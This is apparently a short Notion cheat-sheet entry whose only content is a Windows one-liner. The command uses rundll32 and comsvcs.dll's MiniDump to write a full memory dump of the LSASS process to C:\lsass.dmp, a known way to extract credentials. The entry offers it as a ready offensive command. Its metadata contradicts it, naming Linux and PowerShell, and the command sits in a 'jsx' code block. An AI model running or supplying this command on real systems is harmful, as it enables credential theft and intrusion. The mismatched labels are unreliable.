# rundll create memory dump

OS: Linux
Description: rundll memory dump
Security Domains: Resource Development (https://www.notion.so/Resource-Development-1444c8e523768023b086cae715467df4?pvs=21)
Target_Technology: PowerShell (https://www.notion.so/PowerShell-1434c8e52376805dba60efbabdb026bf?pvs=21)

```jsx
rundll32 C:\windows\system32\comsvcs.dll, MiniDump 672 C:\lsass.dmp full
```